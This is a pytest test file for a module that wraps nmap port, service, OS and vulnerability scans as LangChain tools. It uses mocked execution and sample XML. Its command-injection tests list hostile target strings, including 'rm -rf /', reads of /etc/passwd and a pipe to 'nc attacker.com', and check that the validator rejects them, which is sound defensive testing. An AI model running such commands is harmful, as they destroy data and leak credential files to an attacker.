"""
Comprehensive Tests for Nmap Integration Module

Tests for tools/nmap_integration.py with mocking (no real tool execution).
Target: 80%+ coverage
"""

import asyncio
import sys
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from tools.nmap_integration import (
    NmapHost,
    NmapPort,
    NmapResult,
    NmapScanner,
    ScanType,
    TimingTemplate,
    create_nmap_result_dict,
    nmap_quick_scan,
    nmap_scan,
    nmap_vuln_scan,
    register_nmap_tools,
)

# Sample XML output for testing
SAMPLE_NMAP_XML = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sS -T3 -p 80,443 -oX - scanme.nmap.org">
<host starttime="1234567890">
    <status state="up" reason="syn-ack"/>
    <address addr="45.33.32.156" addrtype="ipv4"/>
    <hostnames>
        <hostname name="scanme.nmap.org" type="user"/>
    </hostnames>
    <ports>
        <port protocol="tcp" portid="80">
            <state state="open" reason="syn-ack"/>
            <service name="http" product="Apache httpd" version="2.4.7">
                <cpe>cpe:/a:apache:http_server:2.4.7</cpe>
            </service>
            <script id="http-title" output="Go ahead and ScanMe!"/>
        </port>
        <port protocol="tcp" portid="443">
            <state state="open" reason="syn-ack"/>
            <service name="https" product="Apache httpd" version="2.4.7" tunnel="ssl"/>
        </port>
        <port protocol="tcp" portid="22">
            <state state="closed" reason="reset"/>
            <service name="ssh"/>
        </port>
    </ports>
    <os>
        <osmatch name="Linux 3.x" accuracy="95" line="12345"/>
        <osmatch name="Linux 4.x" accuracy="90" line="12346"/>
    </os>
    <hostscript>
        <script id="nbstat" output="NetBIOS name: TEST"/>
    </hostscript>
    <trace>
        <hop ttl="1" ipaddr="192.168.1.1" rtt="0.5"/>
        <hop ttl="2" ipaddr="10.0.0.1" rtt="1.2"/>
    </trace>
</host>
</nmaprun>"""

SAMPLE_NMAP_XML_MULTIPLE_HOSTS = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sS 192.168.1.0/24">
<host starttime="1234567890">
    <status state="up" reason="syn-ack"/>
    <address addr="192.168.1.1" addrtype="ipv4"/>
    <ports>
        <port protocol="tcp" portid="80">
            <state state="open"/>
            <service name="http"/>
        </port>
    </ports>
</host>
<host starttime="1234567891">
    <status state="up" reason="syn-ack"/>
    <address addr="192.168.1.2" addrtype="ipv4"/>
    <ports>
        <port protocol="tcp" portid="22">
            <state state="open"/>
            <service name="ssh"/>
        </port>
    </ports>
</host>
<host starttime="1234567892">
    <status state="down" reason="no-response"/>
    <address addr="192.168.1.3" addrtype="ipv4"/>
</host>
</nmaprun>"""

SAMPLE_NMAP_XML_NO_HOSTS = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sS 192.168.255.255">
<runstats>
    <finished time="1234567890"/>
    <hosts up="0" down="1" total="1"/>
</runstats>
</nmaprun>"""


# ============================================================================
# Test NmapScanner Initialization
# ============================================================================


class TestNmapScannerInit:
    """Test NmapScanner initialization."""

    def test_init_with_single_target(self):
        """Test initialization with single target."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            assert scanner.targets == ["192.168.1.1"]
            assert scanner.options["timing"] == TimingTemplate.NORMAL
            assert scanner.options["scan_type"] == ScanType.SYN

    def test_init_with_multiple_targets(self):
        """Test initialization with multiple targets."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner(["192.168.1.1", "192.168.1.2"])
            assert scanner.targets == ["192.168.1.1", "192.168.1.2"]

    def test_init_with_cidr(self):
        """Test initialization with CIDR notation."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.0/24")
            assert scanner.targets == ["192.168.1.0/24"]

    def test_init_with_options(self):
        """Test initialization with custom options."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            options = {
                "ports": "80,443",
                "timing": TimingTemplate.AGGRESSIVE,
                "service_detection": True,
            }
            scanner = NmapScanner("scanme.nmap.org", options)
            assert scanner.options["ports"] == "80,443"
            assert scanner.options["timing"] == TimingTemplate.AGGRESSIVE
            assert scanner.options["service_detection"] is True

    def test_init_nmap_not_found(self):
        """Test error when nmap is not found."""
        with patch("shutil.which", return_value=None):
            with pytest.raises(RuntimeError) as exc_info:
                NmapScanner("192.168.1.1", nmap_path="nonexistent_nmap")
            assert "nmap not found" in str(exc_info.value)

    def test_init_invalid_target_characters(self):
        """Test that dangerous characters are rejected."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with pytest.raises(ValueError) as exc_info:
                NmapScanner("192.168.1.1; rm -rf /")
            assert "Invalid characters" in str(exc_info.value)

    def test_init_pipe_in_target(self):
        """Test that pipe character is rejected."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with pytest.raises(ValueError) as exc_info:
                NmapScanner("192.168.1.1 | cat /etc/passwd")
            assert "Invalid characters" in str(exc_info.value)

    def test_init_with_custom_nmap_path(self):
        """Test initialization with custom nmap path."""
        with patch("shutil.which", return_value="/custom/path/nmap"):
            scanner = NmapScanner("192.168.1.1", nmap_path="/custom/path/nmap")
            assert scanner.nmap_path == "/custom/path/nmap"


# ============================================================================
# Test Target Validation
# ============================================================================


class TestTargetValidation:
    """Test target validation."""

    def test_valid_ipv4(self):
        """Test valid IPv4 address."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            assert "192.168.1.1" in scanner.targets

    def test_valid_ipv6(self):
        """Test valid IPv6 address."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("::1")
            assert "::1" in scanner.targets

    def test_valid_cidr(self):
        """Test valid CIDR notation."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.0/24")
            assert "192.168.1.0/24" in scanner.targets

    def test_valid_hostname(self):
        """Test valid hostname."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            assert "scanme.nmap.org" in scanner.targets

    def test_empty_target(self):
        """Test empty target handling."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with pytest.raises(ValueError):
                NmapScanner("")

    def test_multiple_valid_targets(self):
        """Test multiple target validation."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            targets = ["192.168.1.1", "scanme.nmap.org", "10.0.0.0/8"]
            scanner = NmapScanner(targets)
            assert len(scanner.targets) == 3

    def test_mixed_valid_invalid_targets(self):
        """Test mixed valid and invalid targets."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            # Empty strings should be filtered out
            scanner = NmapScanner(["192.168.1.1", "", "scanme.nmap.org"])
            assert len(scanner.targets) == 2

    def test_command_injection_prevention(self):
        """Test command injection prevention with various characters."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            dangerous_targets = [
                "192.168.1.1; rm -rf /",
                "192.168.1.1 && cat /etc/passwd",
                "192.168.1.1 | nc attacker.com",
                "192.168.1.1`whoami`",
                "192.168.1.1$(cat /etc/passwd)",
                "192.168.1.1 || evil_command",
                "192.168.1.1> /dev/null",
                "192.168.1.1< /etc/passwd",
            ]

            for target in dangerous_targets:
                with pytest.raises(ValueError) as exc_info:
                    NmapScanner(target)
                assert "Invalid characters" in str(exc_info.value)


# ============================================================================
# Test Command Building
# ============================================================================


class TestCommandBuilding:
    """Test command line building."""

    @pytest.fixture
    def scanner(self):
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            return NmapScanner("192.168.1.1")

    def test_basic_command(self, scanner):
        """Test basic command structure."""
        cmd = scanner._build_command()
        assert cmd[0] == "/usr/bin/nmap"
        assert "-sS" in cmd  # SYN scan
        assert "-T3" in cmd  # Normal timing
        assert "-oX" in cmd  # XML output
        assert "-" in cmd  # stdout
        assert "192.168.1.1" in cmd  # target

    def test_scan_types(self, scanner):
        """Test different scan types."""
        test_cases = [
            (ScanType.SYN, "-sS"),
            (ScanType.CONNECT, "-sT"),
            (ScanType.UDP, "-sU"),
            (ScanType.FIN, "-sF"),
            (ScanType.NULL, "-sN"),
            (ScanType.XMAS, "-sX"),
            (ScanType.ACK, "-sA"),
            (ScanType.WINDOW, "-sW"),
            (ScanType.MAIMON, "-sM"),
        ]

        for scan_type, expected_flag in test_cases:
            scanner.options["scan_type"] = scan_type
            cmd = scanner._build_command()
            assert expected_flag in cmd

    def test_timing_templates(self, scanner):
        """Test timing template flags."""
        test_cases = [
            (TimingTemplate.PARANOID, "-T0"),
            (TimingTemplate.SNEAKY, "-T1"),
            (TimingTemplate.POLITE, "-T2"),
            (TimingTemplate.NORMAL, "-T3"),
            (TimingTemplate.AGGRESSIVE, "-T4"),
            (TimingTemplate.INSANE, "-T5"),
        ]

        for timing, expected_flag in test_cases:
            scanner.options["timing"] = timing
            cmd = scanner._build_command()
            assert expected_flag in cmd

    def test_port_specification(self, scanner):
        """Test port specification."""
        scanner.options["ports"] = "80,443,8080"
        cmd = scanner._build_command()
        assert "-p" in cmd
        assert "80,443,8080" in cmd

    def test_top_ports_preset(self, scanner):
        """Test top ports preset."""
        scanner.options["ports"] = "top-10"
        cmd = scanner._build_command()
        assert "-p" in cmd
        # Should contain common ports
        assert any(port in str(cmd) for port in ["22", "80", "443"])

    def test_top_1000_ports(self, scanner):
        """Test top-1000 ports preset."""
        scanner.options["ports"] = "top-1000"
        cmd = scanner._build_command()
        assert "--top-ports" in cmd
        assert "1000" in cmd

    def test_service_detection(self, scanner):
        """Test service detection flag."""
        scanner.options["service_detection"] = True
        scanner.options["version_intensity"] = 9
        cmd = scanner._build_command()
        assert "-sV" in cmd
        assert "--version-intensity" in cmd
        assert "9" in cmd

    def test_os_detection(self, scanner):
        """Test OS detection flag."""
        scanner.options["os_detection"] = True
        scanner.options["osscan_limit"] = True
        cmd = scanner._build_command()
        assert "-O" in cmd
        assert "--osscan-limit" in cmd

    def test_script_scan_default(self, scanner):
        """Test default script scan."""
        scanner.options["script_scan"] = True
        cmd = scanner._build_command()
        assert "-sC" in cmd

    def test_script_scan_specific(self, scanner):
        """Test specific script scan."""
        scanner.options["script_scan"] = "http-title,vulners"
        cmd = scanner._build_command()
        assert "--script" in cmd
        assert "http-title,vulners" in cmd

    def test_script_scan_list(self, scanner):
        """Test script scan with list."""
        scanner.options["script_scan"] = ["http-title", "vulners"]
        cmd = scanner._build_command()
        assert "--script" in cmd
        assert "http-title,vulners" in cmd

    def test_aggressive_scan(self, scanner):
        """Test aggressive scan flag."""
        scanner.options["aggressive"] = True
        cmd = scanner._build_command()
        assert "-A" in cmd

    def test_ping_scan(self, scanner):
        """Test ping scan flag."""
        scanner.options["ping_scan"] = True
        cmd = scanner._build_command()
        assert "-sn" in cmd

    def test_no_ping(self, scanner):
        """Test no ping flag."""
        scanner.options["no_ping"] = True
        cmd = scanner._build_command()
        assert "-Pn" in cmd

    def test_verbosity(self, scanner):
        """Test verbosity levels."""
        scanner.options["verbosity"] = 2
        cmd = scanner._build_command()
        assert "-vv" in cmd

    def test_debugging(self, scanner):
        """Test debugging levels."""
        scanner.options["debugging"] = 1
        cmd = scanner._build_command()
        assert "-d" in cmd

    def test_advanced_options(self, scanner):
        """Test advanced options."""
        scanner.options["source_port"] = 53
        scanner.options["interface"] = "eth0"
        scanner.options["max_retries"] = 3
        scanner.options["host_timeout"] = "30m"
        scanner.options["scan_delay"] = "1s"
        scanner.options["max_rate"] = 1000
        
        cmd = scanner._build_command()
        assert "-g" in cmd and "53" in cmd
        assert "-e" in cmd and "eth0" in cmd
        assert "--max-retries" in cmd and "3" in cmd
        assert "--host-timeout" in cmd and "30m" in cmd
        assert "--scan-delay" in cmd and "1s" in cmd
        assert "--max-rate" in cmd and "1000" in cmd

    def test_additional_args(self, scanner):
        """Test additional arguments."""
        scanner.options["additional_args"] = ["--randomize-hosts", "--packet-trace"]
        cmd = scanner._build_command()
        assert "--randomize-hosts" in cmd
        assert "--packet-trace" in cmd

    def test_multiple_targets_in_command(self, scanner):
        """Test command with multiple targets."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner(["scanme.nmap.org", "example.com"])
            cmd = scanner._build_command()
            assert cmd[-2] == "scanme.nmap.org"
            assert cmd[-1] == "example.com"

    def test_string_scan_type(self, scanner):
        """Test string scan type instead of enum."""
        scanner.options["scan_type"] = "-sT"
        cmd = scanner._build_command()
        assert "-sT" in cmd

    def test_string_timing(self, scanner):
        """Test string timing instead of enum."""
        scanner.options["timing"] = "-T5"
        cmd = scanner._build_command()
        assert "-T5" in cmd


# ============================================================================
# Test XML Parsing
# ============================================================================


class TestXMLParsing:
    """Test XML output parsing."""

    def test_parse_host(self):
        """Test parsing a single host."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            assert len(hosts) == 1
            host = hosts[0]
            assert host.ip == "45.33.32.156"
            assert host.hostname == "scanme.nmap.org"
            assert host.status == "up"
            assert host.os_match == "Linux 3.x"
            assert host.os_accuracy == 95

    def test_parse_ports(self):
        """Test parsing port information."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            host = hosts[0]
            assert len(host.ports) == 3

            # Check open port 80
            port_80 = next(p for p in host.ports if p.port == 80)
            assert port_80.protocol == "tcp"
            assert port_80.state == "open"
            assert port_80.service == "http"
            assert "2.4.7" in port_80.version or "Apache" in port_80.version
            assert len(port_80.cpe) > 0
            assert "http-title" in port_80.scripts

            # Check closed port 22
            port_22 = next(p for p in host.ports if p.port == 22)
            assert port_22.state == "closed"

    def test_parse_os_matches(self):
        """Test parsing OS fingerprinting results."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            host = hosts[0]
            assert len(host.os_matches) == 2
            assert host.os_matches[0]["name"] == "Linux 3.x"
            assert host.os_matches[0]["accuracy"] == 95

    def test_parse_host_scripts(self):
        """Test parsing host script output."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            host = hosts[0]
            assert "nbstat" in host.host_scripts
            assert host.host_scripts["nbstat"] == "NetBIOS name: TEST"

    def test_parse_traceroute(self):
        """Test parsing traceroute data."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            host = hosts[0]
            assert len(host.trace) == 2
            assert host.trace[0]["ttl"] == "1"
            assert host.trace[0]["ipaddr"] == "192.168.1.1"

    def test_parse_no_hosts(self):
        """Test parsing output with no hosts found."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.255.255")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML_NO_HOSTS)
            assert len(hosts) == 0

    def test_parse_malformed_xml(self):
        """Test fallback parsing for malformed XML."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            malformed = '<host><address addr="192.168.1.1" addrtype="ipv4"/></invalid>'
            # Should not raise exception
            hosts = scanner.parse_xml_output(malformed)
            # May have partial results or empty list
            assert isinstance(hosts, list)

    def test_parse_multiple_hosts(self):
        """Test parsing output with multiple hosts."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.0/24")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML_MULTIPLE_HOSTS)
            
            assert len(hosts) == 3
            
            # Check first host
            assert hosts[0].ip == "192.168.1.1"
            assert hosts[0].status == "up"
            
            # Check second host
            assert hosts[1].ip == "192.168.1.2"
            assert hosts[1].status == "up"
            
            # Check down host
            assert hosts[2].ip == "192.168.1.3"
            assert hosts[2].status == "down"


# ============================================================================
# Test Fallback Parsing
# ============================================================================


class TestFallbackParsing:
    """Test fallback regex-based parsing."""

    def test_fallback_parse_host(self):
        """Test fallback parsing extracts host info."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            xml = '<host><address addr="192.168.1.1" addrtype="ipv4"/><status state="up"/></host>'
            hosts = scanner._fallback_parse(xml)

            assert len(hosts) == 1
            assert hosts[0].ip == "192.168.1.1"
            assert hosts[0].status == "up"

    def test_fallback_parse_multiple_hosts(self):
        """Test fallback parsing with multiple hosts."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.0/24")
            xml = """
            <host><address addr="192.168.1.1" addrtype="ipv4"/><status state="up"/></host>
            <host><address addr="192.168.1.2" addrtype="ipv4"/><status state="down"/></host>
            """
            hosts = scanner._fallback_parse(xml)
            assert len(hosts) == 2

    def test_fallback_parse_no_match(self):
        """Test fallback parsing with no matches."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            hosts = scanner._fallback_parse("<invalid>not a host</invalid>")
            assert len(hosts) == 0


# ============================================================================
# Test Async Scanning
# ============================================================================


class TestAsyncScanning:
    """Test async scanning functionality."""

    def test_successful_scan(self):
        """Test successful scan execution."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.scan())

                assert result.success is True
                assert len(result.hosts) == 1
                assert result.error is None
                assert result.scan_time > 0
                assert "total_hosts" in result.summary

    def test_scan_failure(self):
        """Test scan failure handling."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")

            mock_result = Mock()
            mock_result.returncode = 1
            mock_result.stdout = ""
            mock_result.stderr = "Error: Invalid target"

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.scan())

                assert result.success is False
                assert "Error" in result.error or "failed" in result.error.lower()

    def test_scan_timeout(self):
        """Test scan timeout handling."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")

            with patch.object(scanner, "_run_subprocess", side_effect=asyncio.TimeoutError):
                result = asyncio.run(scanner.scan(timeout=1))

                assert result.success is False
                assert "timeout" in result.error.lower() or "timed out" in result.error.lower()

    def test_scan_exception(self):
        """Test exception handling during scan."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")

            with patch.object(scanner, "_run_subprocess", side_effect=Exception("Network error")):
                result = asyncio.run(scanner.scan())

                assert result.success is False
                assert "Network error" in result.error


# ============================================================================
# Test Convenience Methods
# ============================================================================


class TestConvenienceMethods:
    """Test convenience scan methods."""

    def test_scan_ports(self):
        """Test scan_ports method."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.scan_ports(ports="80,443", scan_type=ScanType.SYN))

                assert result["success"] is True
                assert "hosts" in result
                assert "summary" in result

    def test_service_detection(self):
        """Test service_detection method."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.service_detection(ports="80,443"))

                assert result["success"] is True
                assert scanner.options["service_detection"] is True

    def test_os_detection(self):
        """Test os_detection method."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.os_detection(ports="80,443"))

                assert result["success"] is True
                assert scanner.options["os_detection"] is True

    def test_run_script(self):
        """Test run_script method."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(
                    scanner.run_script(
                        script_name="http-title",
                        ports="80",
                        script_args={"http.useragent": "Mozilla/5.0"},
                    )
                )

                assert result["success"] is True
                assert scanner.options["script_scan"] == "http-title"


# ============================================================================
# Test LangChain Tools
# ============================================================================


class TestLangChainTools:
    """Test LangChain tool wrappers."""

    def test_nmap_scan_tool(self):
        """Test nmap_scan tool function."""
        # nmap_scan is a LangChain StructuredTool, use invoke() method
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with patch("asyncio.run") as mock_run:
                mock_result = Mock()
                mock_result.success = True
                mock_result.scan_time = 5.0
                mock_result.command = "nmap -sS scanme.nmap.org"
                mock_result.hosts = []
                mock_result.summary = {"total_hosts": 0}

                mock_run.return_value = mock_result

                result = nmap_scan.invoke({"target": "scanme.nmap.org"})
                assert isinstance(result, str)

    def test_nmap_quick_scan_tool(self):
        """Test nmap_quick_scan tool function."""
        # nmap_quick_scan is a LangChain StructuredTool, use invoke() method
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with patch("asyncio.run") as mock_run:
                mock_result = Mock()
                mock_result.success = True
                mock_result.hosts = []

                mock_run.return_value = mock_result

                result = nmap_quick_scan.invoke({"target": "192.168.1.1"})
                assert isinstance(result, str)

    def test_nmap_vuln_scan_tool(self):
        """Test nmap_vuln_scan tool function."""
        # nmap_vuln_scan is a LangChain StructuredTool, use invoke() method
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with patch("asyncio.run") as mock_run:
                mock_result = Mock()
                mock_result.success = True
                mock_result.hosts = []

                mock_run.return_value = mock_result

                result = nmap_vuln_scan.invoke({"target": "192.168.1.1"})
                assert isinstance(result, str)


# ============================================================================
# Test Helper Functions
# ============================================================================


class TestHelperFunctions:
    """Test helper functions."""

    def test_create_nmap_result_dict(self):
        """Test result dictionary creation."""
        host = NmapHost(
            ip="192.168.1.1",
            status="up",
            ports=[
                NmapPort(port=80, protocol="tcp", state="open", service="http"),
                NmapPort(port=443, protocol="tcp", state="open", service="https"),
                NmapPort(port=22, protocol="tcp", state="closed", service="ssh"),
            ],
        )

        result = create_nmap_result_dict([host])

        assert result["tool"] == "nmap"
        assert result["total_hosts"] == 1
        assert result["hosts_up"] == 1
        assert len(result["open_ports"]) == 2

        # Check open port info
        port_80 = next(p for p in result["open_ports"] if p["port"] == 80)
        assert port_80["service"] == "http"
        assert port_80["host"] == "192.168.1.1"

    def test_create_nmap_result_dict_multiple_hosts(self):
        """Test result dictionary with multiple hosts."""
        hosts = [
            NmapHost(ip="192.168.1.1", status="up", ports=[
                NmapPort(port=80, protocol="tcp", state="open", service="http"),
            ]),
            NmapHost(ip="192.168.1.2", status="up", ports=[
                NmapPort(port=22, protocol="tcp", state="open", service="ssh"),
            ]),
            NmapHost(ip="192.168.1.3", status="down"),
        ]

        result = create_nmap_result_dict(hosts)

        assert result["total_hosts"] == 3
        assert result["hosts_up"] == 2
        assert len(result["open_ports"]) == 2


# ============================================================================
# Test Security
# ============================================================================


class TestSecurity:
    """Test security features."""

    def test_command_injection_prevention(self):
        """Test that command injection is prevented."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            dangerous_targets = [
                "192.168.1.1; rm -rf /",
                "192.168.1.1 && cat /etc/passwd",
                "192.168.1.1 | nc attacker.com",
                "192.168.1.1`whoami`",
                "192.168.1.1$(cat /etc/passwd)",
            ]

            for target in dangerous_targets:
                with pytest.raises(ValueError) as exc_info:
                    NmapScanner(target)
                assert "Invalid characters" in str(exc_info.value)


# ============================================================================
# Test Result Formatting
# ============================================================================


class TestResultFormatting:
    """Test result formatting and conversion."""

    def test_result_to_dict(self):
        """Test conversion of result to dictionary."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            host = NmapHost(
                ip="192.168.1.1",
                hostname="test.local",
                status="up",
                os_match="Linux 5.x",
                os_accuracy=98,
                ports=[
                    NmapPort(
                        port=80,
                        protocol="tcp",
                        state="open",
                        service="http",
                        version="nginx 1.18.0",
                        scripts={"http-title": "Welcome"},
                    ),
                ],
            )

            result = NmapResult(
                success=True,
                hosts=[host],
                command="nmap -sS 192.168.1.1",
                scan_time=10.5,
                summary={"total_hosts": 1},
            )

            result_dict = scanner._result_to_dict(result)

            assert result_dict["success"] is True
            assert result_dict["scan_time"] == 10.5
            assert len(result_dict["hosts"]) == 1

            host_dict = result_dict["hosts"][0]
            assert host_dict["ip"] == "192.168.1.1"
            assert host_dict["hostname"] == "test.local"
            assert len(host_dict["ports"]) == 1

            port_dict = host_dict["ports"][0]
            assert port_dict["port"] == 80
            assert port_dict["service"] == "http"
            assert port_dict["scripts"]["http-title"] == "Welcome"


# ============================================================================
# Test Data Classes
# ============================================================================


class TestDataClasses:
    """Test dataclass definitions."""

    def test_nmap_port_defaults(self):
        """Test NmapPort default values."""
        port = NmapPort(port=80, protocol="tcp", state="open")
        assert port.port == 80
        assert port.protocol == "tcp"
        assert port.state == "open"
        assert port.service == ""
        assert port.version == ""
        assert port.banner == ""
        assert port.cpe == []
        assert port.scripts == {}

    def test_nmap_host_defaults(self):
        """Test NmapHost default values."""
        host = NmapHost(ip="192.168.1.1")
        assert host.ip == "192.168.1.1"
        assert host.hostname == ""
        assert host.status == ""
        assert host.os_match == ""
        assert host.os_accuracy == 0
        assert host.os_matches == []
        assert host.ports == []
        assert host.mac_address == ""
        assert host.vendor == ""
        assert host.host_scripts == {}
        assert host.trace == []

    def test_nmap_result_defaults(self):
        """Test NmapResult default values."""
        result = NmapResult(success=True)
        assert result.success is True
        assert result.hosts == []
        assert result.command == ""
        assert result.scan_time == 0.0
        assert result.error is None
        assert result.raw_xml == ""
        assert result.summary == {}


# ============================================================================
# Test Enums
# ============================================================================


class TestEnums:
    """Test enum definitions."""

    def test_scan_type_values(self):
        """Test all scan types have correct values."""
        assert ScanType.SYN.value == "-sS"
        assert ScanType.CONNECT.value == "-sT"
        assert ScanType.UDP.value == "-sU"
        assert ScanType.ACK.value == "-sA"
        assert ScanType.WINDOW.value == "-sW"
        assert ScanType.MAIMON.value == "-sM"
        assert ScanType.FIN.value == "-sF"
        assert ScanType.NULL.value == "-sN"
        assert ScanType.XMAS.value == "-sX"
        assert ScanType.PING.value == "-sn"

    def test_timing_template_values(self):
        """Test all timing templates have correct values."""
        assert TimingTemplate.PARANOID.value == "-T0"
        assert TimingTemplate.SNEAKY.value == "-T1"
        assert TimingTemplate.POLITE.value == "-T2"
        assert TimingTemplate.NORMAL.value == "-T3"
        assert TimingTemplate.AGGRESSIVE.value == "-T4"
        assert TimingTemplate.INSANE.value == "-T5"


# ============================================================================
# Test TOP_PORTS Dictionary
# ============================================================================


class TestTopPorts:
    """Test TOP_PORTS presets."""

    def test_top_10_ports(self):
        """Test top-10 ports preset."""
        ports = NmapScanner.TOP_PORTS["top-10"]
        assert "22" in ports
        assert "80" in ports
        assert "443" in ports

    def test_top_100_ports(self):
        """Test top-100 ports preset."""
        ports = NmapScanner.TOP_PORTS["top-100"]
        port_list = ports.split(",")
        # The top-100 list may have duplicates but should have many ports
        assert len(port_list) >= 90  # Allow some flexibility for formatting

    def test_top_1000_marker(self):
        """Test top-1000 marker."""
        assert NmapScanner.TOP_PORTS["top-1000"] == "top-1000"


# ============================================================================
# Test Tool Registry Integration
# ============================================================================


class TestToolRegistryIntegration:
    """Test integration with tool registry."""

    @patch("tools.nmap_integration.TOOL_REGISTRY_AVAILABLE", True)
    @patch("tools.nmap_integration.LANGCHAIN_AVAILABLE", True)
    @patch("tools.nmap_integration.registry")
    def test_register_nmap_tools(self, mock_registry):
        """Test registering nmap tools with registry."""
        register_nmap_tools()

        # Should register 3 tools
        assert mock_registry.register.call_count == 3

    @patch("tools.nmap_integration.TOOL_REGISTRY_AVAILABLE", False)
    def test_register_when_registry_unavailable(self):
        """Test registration when registry is not available."""
        # Should not raise exception
        result = register_nmap_tools()
        assert result is None

    @patch("tools.nmap_integration.TOOL_REGISTRY_AVAILABLE", True)
    @patch("tools.nmap_integration.LANGCHAIN_AVAILABLE", True)
    @patch("tools.nmap_integration.registry")
    def test_register_with_exception(self, mock_registry):
        """Test registration handling exceptions."""
        mock_registry.register.side_effect = Exception("Registry error")

        # Should not raise exception
        result = register_nmap_tools()
        assert result is None


# ============================================================================
# Test Error Handling
# ============================================================================


class TestErrorHandling:
    """Test error handling scenarios."""

    def test_empty_xml_parsing(self):
        """Test parsing empty XML."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            hosts = scanner.parse_xml_output('<?xml version="1.0"?><nmaprun></nmaprun>')
            assert len(hosts) == 0

    def test_host_without_address(self):
        """Test parsing host without valid address."""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            xml = """<?xml version="1.0"?>
            <nmaprun>
                <host><status state="up"/></host>
            </nmaprun>"""
            hosts = scanner.parse_xml_output(xml)
            assert len(hosts) == 0

    def test_scan_with_zero_timeout(self):
        """Test scan with minimal timeout."""
